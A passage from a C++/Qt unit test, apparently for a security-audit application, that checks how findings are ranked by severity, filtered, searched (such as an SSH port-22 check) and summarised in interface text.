    check(severityRank(FindingState::Critical) < severityRank(FindingState::Warning) && severityRank(FindingState::Warning) < severityRank(FindingState::Review)
              && severityRank(FindingState::Review) < severityRank(FindingState::Pass),
          QStringLiteral("critical findings sort first"));
    const auto count = [&](FindingFilter filter) {
        int total = 0;
        for (const Finding &item : findings)
            total += matchesFilter(item, filter) ? 1 : 0;
        return total;
    };
    check(count(FindingFilter::All) == findings.size(), QStringLiteral("the All filter shows every check"));
    check(count(FindingFilter::Attention) == count(FindingFilter::Critical) + count(FindingFilter::Warning) + count(FindingFilter::Review),
          QStringLiteral("Needs attention is critical, warning and review together"));
    check(count(FindingFilter::Review) > 0 && count(FindingFilter::Fixable) > 0, QStringLiteral("review and fixable filters find checks"));
    check(!matchesFilter(*finding(findings, QStringLiteral("port-22")), FindingFilter::Pass), QStringLiteral("a review finding is not shown as passed"));
    check(matchesQuery(*finding(findings, QStringLiteral("port-22")), QStringLiteral("ssh")), QStringLiteral("the search matches a check title"));
    check(filters().size() == 8 && filterName(FindingFilter::Review) == QStringLiteral("For review"), QStringLiteral("filters have readable names"));

    check(stateSummary(findings).startsWith(QString::number(catalog.size())), QStringLiteral("the summary reports the full check count"));
    check(filteredSummary(findings, 1, QStringLiteral("SSH")).startsWith(QStringLiteral("Showing 1 of ")),
          QStringLiteral("a filtered summary keeps the matching and total check counts visible"));
    check(filteredSummary(findings, 0, QStringLiteral("not-a-security-check")).startsWith(QStringLiteral("No checks match")),
          QStringLiteral("an empty filter reports what happened and how to continue"));
    check(filteredSummary(findings, 3, {}, FindingFilter::Review, QStringLiteral("Accounts")).startsWith(QStringLiteral("Showing 3 of %1 checks in For review · Accounts.").arg(findings.size())),
          QStringLiteral("a status and category filter is named in the summary"));
    check(filteredSummary(findings, 0, {}, FindingFilter::Critical).startsWith(QStringLiteral("No checks in Critical. Try a different filter.")),
          QStringLiteral("an empty status filter says which filter is empty"));
    return failures == 0 ? 0 : 1;
}
